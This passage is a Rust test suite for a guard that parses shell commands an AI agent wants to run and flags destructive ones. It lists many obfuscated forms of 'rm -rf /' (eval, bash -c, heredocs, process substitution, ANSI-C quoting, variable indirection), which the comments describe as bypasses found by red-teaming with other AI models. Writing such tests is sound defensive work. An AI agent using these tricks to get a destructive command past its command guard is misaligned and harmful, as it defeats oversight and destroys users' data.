        // dynamic marker (because it inspects raw arg text without
        // bindings). That's a separate hardening — record current
        // behaviour: at minimum the destruction is flagged somehow.
        assert!(
            c.iter().any(|cmd| {
                cmd.argv[0] == "__eval_dynamic__"
                    || cmd.argv[0] == "__indirect_unresolved__"
                    || cmd.argv == vec!["rm", "-rf", "/"]
            }),
            "eval of bound var must surface as a destructive signal, got: {c:#?}"
        );
    }

    // ── parse_assignment unit tests ─────────────────────────────────

    #[test]
    fn parse_assignment_basic_double_quoted() {
        assert_eq!(
            parse_assignment("a=\"rm -rf /\""),
            Some(("a".into(), "rm -rf /".into()))
        );
    }

    #[test]
    fn parse_assignment_basic_single_quoted() {
        assert_eq!(
            parse_assignment("a='rm -rf /'"),
            Some(("a".into(), "rm -rf /".into()))
        );
    }

    #[test]
    fn parse_assignment_unquoted_value() {
        assert_eq!(
            parse_assignment("CACHE=builds"),
            Some(("CACHE".into(), "builds".into()))
        );
    }

    #[test]
    fn parse_assignment_rejects_dynamic_rhs() {
        assert_eq!(parse_assignment("a=$(rm)"), None);
        assert_eq!(parse_assignment("a=$b"), None);
        assert_eq!(parse_assignment("a=`rm`"), None);
    }

    #[test]
    fn parse_assignment_rejects_array() {
        assert_eq!(parse_assignment("a=(one two)"), None);
    }

    #[test]
    fn parse_assignment_rejects_invalid_name() {
        assert_eq!(parse_assignment("=value"), None);
        assert_eq!(parse_assignment("1a=value"), None);
        assert_eq!(parse_assignment("a-b=value"), None);
    }

    // ── expand_vars unit tests ──────────────────────────────────────

    fn walker_with_bindings(pairs: &[(&str, &str)]) -> Walker<'static> {
        let mut w = Walker::new(b"");
        for (k, v) in pairs {
            w.bindings.insert((*k).to_string(), (*v).to_string());
        }
        w
    }

    #[test]
    fn expand_vars_simple() {
        let w = walker_with_bindings(&[("a", "rm -rf /")]);
        assert_eq!(w.expand_vars("$a"), Some("rm -rf /".into()));
        assert_eq!(w.expand_vars("${a}"), Some("rm -rf /".into()));
    }

    #[test]
    fn expand_vars_concatenation() {
        let w = walker_with_bindings(&[("a", "rm -"), ("b", "rf /")]);
        assert_eq!(w.expand_vars("$a$b"), Some("rm -rf /".into()));
        assert_eq!(w.expand_vars("${a}${b}"), Some("rm -rf /".into()));
    }

    #[test]
    fn expand_vars_unknown_returns_none() {
        let w = walker_with_bindings(&[]);
        assert_eq!(w.expand_vars("$unknown"), None);
    }

    #[test]
    fn expand_vars_dynamic_returns_none() {
        let w = walker_with_bindings(&[("a", "ls")]);
        // Command substitutions inside our text are unresolvable —
        // we cannot peek inside `$(...)` or `` $`...` `` to know what
        // they emit, so the whole text is unsafe to parse as a fixed
        // payload.
        assert_eq!(w.expand_vars("$a $(curl)"), None);
        assert_eq!(w.expand_vars("$`cmd`"), None);
        // Note: bare backticks (not preceded by `$`) are NOT
        // expansion sites for expand_vars's purpose — tree-sitter
        // walks `command_substitution` nodes independently and
        // surfaces inner commands. expand_vars only resolves `$X`
        // forms, so `` `cmd` `` passes through as literal text.
    }

    #[test]
    fn expand_vars_parametric_returns_none() {
        let w = walker_with_bindings(&[("a", "ls")]);
        assert_eq!(w.expand_vars("${a:-default}"), None);
    }

    #[test]
    fn expand_vars_positional_returns_none() {
        let w = walker_with_bindings(&[]);
        assert_eq!(w.expand_vars("$1"), None);
        assert_eq!(w.expand_vars("$@"), None);
        assert_eq!(w.expand_vars("$$"), None);
    }

    #[test]
    fn expand_vars_preserves_literals() {
        let w = walker_with_bindings(&[("a", "/tmp")]);
        assert_eq!(
            w.expand_vars("rm -rf $a/cache"),
            Some("rm -rf /tmp/cache".into())
        );
    }

    #[test]
    fn expand_vars_bare_dollar_is_literal() {
        let w = walker_with_bindings(&[]);
        assert_eq!(w.expand_vars("price: $"), Some("price: $".into()));
    }

    // ── envelope predicate corpus (decision.guard-indirection-hardening) ─
    //
    // The full bypass set verified by tribunal (Codex high + Gemini flash)
    // against the headline patch. Each case below was a `safe` verdict
    // before the envelope predicate landed; each must now produce an
    // EffectiveCommand stream that contains either a real destructive
    // command (rm, etc.) OR the `__indirect_unresolved__` marker. The
    // helper asserts one of those holds.

    fn assert_destructive_signal(src: &str) {
        let c = cmds(src);
        let ok = c.iter().any(|cmd| {
            cmd.argv[0] == "__indirect_unresolved__"
                || cmd.argv[0] == "__eval_dynamic__"
                || cmd.argv[0] == "__pipe_to_shell__"
                || cmd.argv == vec!["rm", "-rf", "/"]
                || (cmd.argv.first().is_some_and(|a| a == "rm")
                    && cmd.argv.iter().any(|a| a == "/"))
        });
        assert!(ok, "expected destructive signal for `{src}`, got: {c:#?}");
    }

    fn assert_safe_no_marker(src: &str) {
        let c = cmds(src);
        let bad = c
            .iter()
            .any(|cmd| cmd.argv[0].starts_with("__") && cmd.argv[0].ends_with("__"));
        assert!(!bad, "expected NO marker for legit `{src}`, got: {c:#?}");
    }

    // Bypass set —————————————————————————————————————————————————

    #[test]
    fn corpus_bypass_headline() {
        assert_destructive_signal("a=\"rm -rf /\" && $a");
    }

    #[test]
    fn corpus_bypass_quoted_command_sub_in_rhs() {
        // Codex C1: parse_assignment must refuse RHS containing $(.
        assert_destructive_signal("a=\"$(echo rm) -rf /\"; $a");
    }

    #[test]
    fn corpus_bypass_backslash_escape_in_rhs() {
        // Codex C1b: refuse RHS containing backslash escapes.
        assert_destructive_signal("a=rm\\ -rf\\ /; $a");
    }

    #[test]
    fn corpus_bypass_command_sub_as_head() {
        // Codex C2: command_substitution as command head must produce
        // a destructive signal — either via the inner walked command
        // (rm here) or the unresolved marker.
        assert_destructive_signal("$(echo rm) -rf /");
    }

    #[test]
    fn corpus_bypass_backtick_as_head() {
        // Gemini G1c: backtick command_substitution as head. Pre-fix
        // this caused stack overflow; envelope must terminate and
        // emit a marker.
        assert_destructive_signal("`rm -rf /`");
    }

    #[test]
    fn corpus_bypass_prefix_concat_var() {
        // Gemini G1b: `r$a -rf /` with a="m" — argv[0] doesn't start
        // with $, but contains_var_ref scans full token.
        assert_destructive_signal("a=\"m\"; r$a -rf /");
    }

    #[test]
    fn corpus_bypass_bash_herestring() {
        // Codex H3: `bash <<< "$a"` — here-string body re-parsed through
        // bindings.
        assert_destructive_signal("a=\"rm -rf /\"; bash <<< \"$a\"");
    }

    #[test]
    fn corpus_bypass_source_process_sub() {
        // Codex H4: `source <(...)` — source/. wrapper emits marker.
        assert_destructive_signal("source <(echo rm -rf /)");
    }

    #[test]
    fn corpus_bypass_source_literal() {
        // source/. with any argument — even literal — is opaque.
        assert_destructive_signal("source ./scripts/anything.sh");
    }

    #[test]
    fn corpus_bypass_eval_dynamic() {
        // Codex H5 spirit: eval with unbound var. Now goes through the
        // same path as bash -c, emits indirect-unresolved.
        assert_destructive_signal("eval \"$UNKNOWN\"");
    }

    #[test]
    fn corpus_bypass_bash_dash_c_with_var() {
        assert_destructive_signal("a=\"rm -rf /\"; bash -c \"$a\"");
    }

    #[test]
    fn corpus_bypass_chained_var_rhs() {
        // a=$b; $a — chained reference, refused at parse_assignment,
        // surfaces as unresolved on use.
        assert_destructive_signal("a=$b; $a");
    }

    // Negative set ————————————————————————————————————————————————
    //
    // These MUST NOT be flagged. Without the negative corpus the
    // envelope can drift into over-approximation (Goodhart) — flagging
    // every $-pattern. Each case below is a legitimate command an
    // agent might run; classifying these destructive would break
    // basic productivity.

    #[test]
    fn corpus_negative_resolved_to_safe_command() {
        // Lexically bound var resolves to ls — must not flag.
        assert_safe_no_marker("a=\"ls -la\" && $a");
    }

    #[test]
    fn corpus_negative_plain_ls() {
        assert_safe_no_marker("ls /tmp");
    }

    #[test]
    fn corpus_negative_cd_then_ls() {
        assert_safe_no_marker("cd /tmp && ls");
    }

    #[test]
    fn corpus_negative_git_status() {
        assert_safe_no_marker("git status");
    }

    #[test]
    fn corpus_negative_cargo_test() {
        assert_safe_no_marker("cargo test");
    }

    #[test]
    fn corpus_negative_env_prefix() {
        // env-prefix on command (NOT a top-level binding).
        assert_safe_no_marker("FOO=1 BAR=2 ls -la");
    }

    #[test]
    fn corpus_negative_legit_assignment_no_use() {
        assert_safe_no_marker("CACHE_DIR=/tmp/cache");
    }

    #[test]
    fn corpus_negative_resolved_brace_form() {
        assert_safe_no_marker("a=\"ls\" && ${a} -la");
    }

    #[test]
    fn corpus_negative_pipeline_safe() {
        assert_safe_no_marker("ls | grep foo | wc -l");
    }

    #[test]
    fn corpus_negative_test_arithmetic() {
        // $((...)) is arithmetic expansion, not command substitution
        // in command position. Currently treated as opaque expansion;
        // this is in the noise tail — record current behaviour rather
        // than over-pin.
        let c = cmds("echo $((1 + 2))");
        // Just check echo itself surfaces as a safe command.
        assert!(c.iter().any(|cmd| cmd.argv[0] == "echo"));
    }

    #[test]
    fn corpus_negative_subshell_isolation_no_leak() {
        // `(a="rm -rf /"); $a` — subshell binding doesn't leak,
        // outer $a unresolved. This is correct behaviour; assert
        // we DO emit the marker (the subshell's binding stays inside).
        // Side note: the rm inside the subshell IS executed in real
        // bash too, but the binding doesn't leak — so this is
        // technically a destructive case for the inner rm-via-bound-var
        // path, which we model.
        let c = cmds("(a=\"rm -rf /\"); echo done");
        // No real rm should surface (inside subshell `a=...; echo done`
        // is a no-op); just `echo done` survives.
        let has_destructive = c.iter().any(|cmd| cmd.argv[0] == "rm");
        assert!(!has_destructive, "subshell shouldn't leak rm: {c:#?}");
    }

    #[test]
    fn corpus_negative_command_sub_arg_safe() {
        // `echo $(date)` — substitution in argument position, not head.
        // We surface `date` as a separate inner command (safe);
        // the outer echo is safe. No marker.
        assert_safe_no_marker("echo $(date)");
    }

    // ── tribunal v2 corpus ──────────────────────────────────────────
    //
    // Tribunal v2 (Codex high + Gemini flash, after the v1 envelope
    // patch landed) found these 7 additional bypass classes. Each
    // one's resolution is documented inline.

    #[test]
    fn corpus_v2_heredoc_to_bash() {
        // `bash <<EOF\nrm -rf /\nEOF` — heredoc body fed to shell.
        // redirected_statement handler synthesizes -c BODY.
        assert_destructive_signal("bash <<EOF\nrm -rf /\nEOF\n");
    }

    #[test]
    fn corpus_v2_bash_process_substitution_script() {
        // `bash <(...)` — process substitution as script input.
        // Treated as opaque indirection.
        assert_destructive_signal("bash <(echo rm -rf /)");
    }

    #[test]
    fn corpus_v2_eval_argument_position_injection() {
        // `read a; eval "echo $a"` — body has unresolved expansion in
        // argument position. Pre-fix we re-parsed `echo $a` and let
        // the inner walker see argv[0]=echo (literal, safe). Post-fix
        // we emit the marker on the body BEFORE re-parse.
        assert_destructive_signal("read a; eval \"echo $a\"");
    }

    #[test]
    fn corpus_v2_bash_c_argument_position_injection() {
        assert_destructive_signal("read a; bash -c \"echo $a\"");
    }

    #[test]
    fn corpus_v2_trusted_env_shadow() {
        // `HOME="$(echo rm) -rf /"; $HOME` — refused-to-bind value
        // for a TRUSTED_ENV name must NOT fall through to env.
        // Tainted sentinel blocks the fallback.
        assert_destructive_signal("HOME=\"$(echo rm) -rf /\"; $HOME");
    }

    #[test]
    fn corpus_v2_ansi_c_quoting_decoded() {
        // `$'rm' -rf /` — ANSI-C string is bash-literal "rm" at parse
        // time. decode_token strips the wrapper so the rules layer
        // sees `rm`.
        assert_destructive_signal("$'rm' -rf /");
    }

    #[test]
    fn corpus_v2_backslash_escape_in_head_decoded() {
        // `\r\m -rf /` — bash-literal "rm". decode_token unwraps.
        assert_destructive_signal("\\r\\m -rf /");
    }

    #[test]
    fn corpus_v2_read_clears_stale_safe_binding() {
        // `a="ls"; read a; $a` — `read` mutates `a` from stdin.
        // We can't see the new value; clearing the binding is the
        // safe answer (envelope then emits marker on $a).
        assert_destructive_signal("a=\"ls\"; read a; $a");
    }

    #[test]
    fn corpus_v2_printf_dash_v_clears_binding() {
        assert_destructive_signal("a=\"ls\"; printf -v a 'rm -rf /'; $a");
    }

    // Negative coverage for the new code paths.

    #[test]
    fn corpus_v2_negative_safe_heredoc_to_cat() {
        // Heredoc fed to a non-shell command is just data input.
        assert_safe_no_marker("cat <<EOF\nhello\nEOF\n");
    }

    #[test]
    fn corpus_v2_negative_safe_ansi_c_arg() {
        // `echo $'hi'` — ANSI-C in argument position, not head.
        assert_safe_no_marker("echo $'hi'");
    }

    #[test]
    fn corpus_v2_negative_resolved_home() {
        // `${HOME}/cache` resolves via boot-time env. No marker.
        // (As long as HOME is set in test env, which it always is.)
        let c = cmds("ls ${HOME}/cache");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "ls"),
            "expected ls, got: {c:#?}"
        );
        let bad = c
            .iter()
            .any(|cmd| cmd.argv[0].starts_with("__") && cmd.argv[0].ends_with("__"));
        assert!(!bad, "trusted-env resolution shouldn't mark: {c:#?}");
    }
}
